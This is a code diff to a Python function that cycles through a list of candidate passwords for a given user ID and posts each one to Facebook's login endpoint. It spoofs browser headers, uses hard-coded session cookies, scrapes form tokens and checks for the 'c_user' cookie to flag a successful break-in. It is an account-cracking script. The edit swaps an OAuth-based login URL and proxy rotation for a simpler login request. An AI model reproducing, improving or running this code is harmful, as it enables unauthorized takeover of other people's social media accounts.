@@ -1552,68 +1552,44 @@ def mobile(uid,pwx,tl):
     sys.stdout.flush()
     try:
         for pw in pwx:
-            nip=random.choice(xvx)
-            proxs= {'http': nip}
             Session = requests.Session()
             free_fb = Session.get('https://touch.facebook.com').text
             data = {
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'api_key': '2036793259884297',
-            'cancel_url': 'https://auth.garena.com/universal/oauth/facebook?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=e6b02808006342d98d036d17990e344d-platform%3D3%26redirect_uri%3Dhttps%253A%252F%252Fzdauth.garena.com%252Flogin%253Fbrand_id%253D360002708674%2526locale_id%253D1%2526return_to%253Dhttps%25253A%25252F%25252Fffsupport.garena.com%25252Fhc%25252Fen-us%2526timestamp%253D1734205219%26response_type%3Dtoken%26client_id%3D100067#_=_',
-            'display': 'page',
-            'isprivate': '',
-            'return_session': '',
-            'skip_api_login': '1',
-            'signed_next': '1',
-            'trynum': '1',
-            'timezone': '-330',
-            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
-            'lgnrnd': '114059_TGse',
-            'lgnjs': '1734205260',
             'email': uid,
-            'prefill_contact_point': uid,
-            'prefill_source': 'browser_dropdown',
-            'prefill_type': 'password',
-            'first_prefill_source': 'browser_dropdown',
-            'first_prefill_type': 'contact_point',
-            'had_cp_prefilled': 'true',
-            'had_password_prefilled': 'true',
-            'ab_test_data': '/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////AAAABAAE',
+            'login_source': 'comet_headerless_login',
+            'next': '',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             cookies = {
-            'sb': '-a1MZ_u5-jjFRs4mHv1VXJat',
+            'datr': '9VEvZ9JBwP-qDedVPM0RiFU2',
+            'fr': '0s2vxnm2t0jH8elbM..BnL1H1..AAA.0.0.BnXtOr.AWVqYBNlP1E',
+            'sb': '9VEvZ6aV778dZuTY2EWKGHcM',
+            'wd': '1440x402',
             'ps_l': '1',
             'ps_n': '1',
-            'datr': 'xyJPZxo1IY_U32w1mU7nTtWz',
-            'locale': 'en_GB',
-            'fr': '01Qmiu4dEZ5S0b2Pm.AWVO8mx-ObHAMpTzMvNwulDD2mk.BlyWeF..AAA.0.0.BnXd9L.AWWfmKk3L5I',
-            'wd': '876x773',}
+            'locale': 'en_GB',}
             headers = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5,bn;q=0.4',
-            'cache-control': 'max-age=0',
-            'content-type': 'application/x-www-form-urlencoded',
-            'dpr': '1',
-            'origin': 'https://www.facebook.com',
-            'priority': 'u=0, i',
-            'referer': 'https://www.facebook.com/login.php?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D2036793259884297%26redirect_uri%3Dhttps%253A%252F%252Fauth.garena.com%252Funiversal%252Foauth%252Ffacebook%26response_type%3Dtoken%26scope%3Dpublic_profile%252Cemail%252Cuser_friends%26state%3De6b02808006342d98d036d17990e344d-platform%253D3%2526redirect_uri%253Dhttps%25253A%25252F%25252Fzdauth.garena.com%25252Flogin%25253Fbrand_id%25253D360002708674%252526locale_id%25253D1%252526return_to%25253Dhttps%2525253A%2525252F%2525252Fffsupport.garena.com%2525252Fhc%2525252Fen-us%252526timestamp%25253D1734205219%2526response_type%253Dtoken%2526client_id%253D100067%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da58e4f5f-94df-4490-b18b-755535e925f9%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.garena.com%2Funiversal%2Foauth%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3De6b02808006342d98d036d17990e344d-platform%253D3%2526redirect_uri%253Dhttps%25253A%25252F%25252Fzdauth.garena.com%25252Flogin%25253Fbrand_id%25253D360002708674%252526locale_id%25253D1%252526return_to%25253Dhttps%2525253A%2525252F%2525252Fffsupport.garena.com%2525252Fhc%2525252Fen-us%252526timestamp%25253D1734205219%2526response_type%253Dtoken%2526client_id%253D100067%23_%3D_&display=page&locale=en_GB&pl_dbl=0',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
-            'sec-ch-ua-full-version-list': '"Google Chrome";v="131.0.6778.140", "Chromium";v="131.0.6778.140", "Not_A Brand";v="24.0.0.0"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-ch-ua-platform-version': '"10.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
-            'viewport-width': '876',}
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate, br, zstd',
+            'Referer': 'https://www.facebook.com/',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Origin': 'https://www.facebook.com',
+            'DNT': '1',
+            'Alt-Used': 'www.facebook.com',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-User': '?1',
+            'Priority': 'u=0, i',
+            'Pragma': 'no-cache',
+            'Cache-Control': 'no-cache',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D2036793259884297%26redirect_uri%3Dhttps%253A%252F%252Fauth.garena.com%252Funiversal%252Foauth%252Ffacebook%26response_type%3Dtoken%26scope%3Dpublic_profile%252Cemail%252Cuser_friends%26state%3De6b02808006342d98d036d17990e344d-platform%253D3%2526redirect_uri%253Dhttps%25253A%25252F%25252Fzdauth.garena.com%25252Flogin%25253Fbrand_id%25253D360002708674%252526locale_id%25253D1%252526return_to%25253Dhttps%2525253A%2525252F%2525252Fffsupport.garena.com%2525252Fhc%2525252Fen-us%252526timestamp%25253D1734205219%2526response_type%253Dtoken%2526client_id%253D100067%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da58e4f5f-94df-4490-b18b-755535e925f9%26tp%3Dunspecified%26cbt%3D1734205260638&lwv=100'
+            url = 'https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM0MjY3ODE5LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ^%^3D^%^3D&next'
             po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
